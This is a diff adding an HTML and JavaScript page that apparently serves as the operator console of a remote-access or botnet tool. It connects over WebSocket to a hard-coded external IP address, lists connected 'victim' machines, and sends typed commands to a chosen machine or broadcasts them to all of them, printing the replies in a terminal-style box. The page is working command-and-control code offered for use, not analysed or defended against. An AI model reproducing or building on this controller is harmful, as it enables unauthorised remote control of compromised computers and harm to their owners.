@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<meta charset="utg-8">
+
+<script>
+
+    var client;
+    var content = "";
+    var contentLength = 0;
+    var command;
+    var firstConnect = true
+
+    function startConnection() {
+        //client = new WebSocket("ws://127.0.0.1:7777", 'websocket')
+        client = new WebSocket("ws://141.226.121.68:5555", 'websocket')
+        client.onopen = function () {
+        }
+        //alert("Connected!")
+        //client.send('The client connected!')
+
+        client.onmessage = function (data) {
+            if (data.data.startsWith("Connected$")) {
+                data = data.data.substr(11, data.data.length)
+                document.getElementById('select ip').innerHTML += '<option value=' + data + '>' + data + '</option>'
+                alert(data + " Connected!")
+            } else if (firstConnect === true) {
+                data = JSON.parse(data.data)
+                firstConnect = false
+                var connected = '';
+                for (var i = 0; i < data.length; i++) {
+                    data[i] = data[i].substr(11, data[i].length)
+                    document.getElementById('select ip').innerHTML += '<option value=' + data[i] + '>' + data[i] + '</option>';
+                    connected += data[i];
+                    console.log(data[i]);
+                }
+                alert(connected)
+                console.log(data);
+            } else {
+                console.log("Received: '" + data.data + "'");
+                content = data.data + "\n"
+                contentLength += content.length + 1;
+                console.log("length is " + contentLength)
+                document.getElementById('area').value += content
+            }
+            firstConnect = false
+        };
+        client.onclose = function () {
+            alert('The connection was close')
+        }
+    }
+
+    document.onkeypress = function (e) {
+        if (e.keyCode === 13) {
+            if (document.activeElement === document.getElementById('area')) {
+                //command = document.getElementById('area').innerText.substr(contentLength).value
+                command = [document.getElementById('area').value.substr(contentLength), document.getElementById('select ip').value]
+                contentLength += command[0].length
+                console.log(command)
+                //Sending the command to every connected IP
+                if (command.toString().startsWith("broadcast")) {
+                    console.log("test")
+                    command[0] = command[0].substr(10, command[0].length)
+                    for (i = 0; i < document.getElementById("select ip").options.length; i++) {
+                        command[1] = document.getElementById('select ip').options[i].text
+                        sendCommand()
+                    }
+                    return
+                }
+                sendCommand()
+                //alert('test')
+            }
+        }
+    }
+
+
+    function sendCommand() {
+        //var x = document.getElementById('command').value
+        command[0] = command[0].replaceAll('\n', '')
+        if (command[0] === "clear" || command[0] === "cls") {
+            content = ""
+            contentLength = 0
+            document.getElementById('area').value = "";
+        } else if (command[0] === "") {
+            return
+        } else {
+            client.send(JSON.stringify(command))
+        }
+    }
+
+
+</script>
+
+<body>
+
+
+<form>
+    <button type="button" onclick="startConnection()">Start Connection</button>
+    <label for="select ip">Please the victim ip</label>
+    <select name="Select IP" id="select ip">
+
+    </select>
+
+</form>
+<textarea id="area" autofocus name="output area" style="background-color:black;color: white" rows="80"
+          cols="200"></textarea>
+
+
+</body>
+
+</html>
